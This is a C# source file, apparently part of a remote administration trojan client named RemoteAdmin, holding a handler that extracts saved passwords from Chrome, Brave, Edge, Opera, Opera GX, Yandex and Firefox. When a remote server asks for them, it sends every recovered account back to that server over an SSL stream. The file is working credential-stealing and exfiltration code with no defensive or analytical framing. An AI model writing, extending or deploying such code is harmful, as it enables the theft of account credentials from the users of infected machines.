using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.Net.Security;
using System.Threading.Tasks;

namespace RemoteAdmin.Client.Handlers
{
    public class PasswordRecoveryHandler
    {
        public static async Task HandlePasswordRecoveryRequest(SslStream stream)
        {
            Console.WriteLine("Starting password recovery...");

            var allAccounts = new List<RecoveredAccount>();

            // Chromium-based browsers
            var chromiumBrowsers = new List<Recovery.Browsers.ChromiumBase>
            {
                new Recovery.Browsers.ChromePassReader(),
                new Recovery.Browsers.BravePassReader(),
                new Recovery.Browsers.EdgePassReader(),
                new Recovery.Browsers.OperaPassReader(),
                new Recovery.Browsers.OperaGXPassReader(),
                new Recovery.Browsers.YandexPassReader()
            };

            // Process Chromium-based browsers
            foreach (var browser in chromiumBrowsers)
            {
                try
                {
                    Console.WriteLine($"Recovering passwords from {browser.ApplicationName}...");
                    var accounts = browser.ReadAccounts();

                    if (accounts != null && accounts.Count > 0)
                    {
                        allAccounts.AddRange(accounts);
                        Console.WriteLine($"Successfully recovered {accounts.Count} passwords from {browser.ApplicationName}");
                    }
                    else
                    {
                        Console.WriteLine($"No passwords found in {browser.ApplicationName}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error reading accounts from {browser.ApplicationName}: {ex.Message}");
                    // Continue with next browser even if one fails
                }
            }

            // Process Firefox (separate because it doesn't inherit from ChromiumBase)
            try
            {
                Console.WriteLine("Recovering passwords from Firefox...");
                var firefoxReader = new Recovery.Browsers.FirefoxPassReader();
                var firefoxAccounts = firefoxReader.ReadAccounts();

                if (firefoxAccounts != null)
                {
                    int firefoxCount = 0;
                    foreach (var account in firefoxAccounts)
                    {
                        allAccounts.Add(account);
                        firefoxCount++;
                    }

                    if (firefoxCount > 0)
                    {
                        Console.WriteLine($"Successfully recovered {firefoxCount} passwords from Firefox");
                    }
                    else
                    {
                        Console.WriteLine("No passwords found in Firefox");
                    }
                }
                else
                {
                    Console.WriteLine("No passwords found in Firefox");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading accounts from Firefox: {ex.Message}");
                // Continue even if Firefox fails
            }

            Console.WriteLine($"Password recovery completed. Found {allAccounts.Count} accounts total.");

            // Send response back to server
            var response = new PasswordRecoveryResponseMessage
            {
                Success = true,
                Accounts = allAccounts
            };

            try
            {
                await NetworkHelper.SendMessageAsync(stream, response);
                Console.WriteLine("Password recovery response sent to server");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send password recovery response: {ex.Message}");
            }
        }
    }
}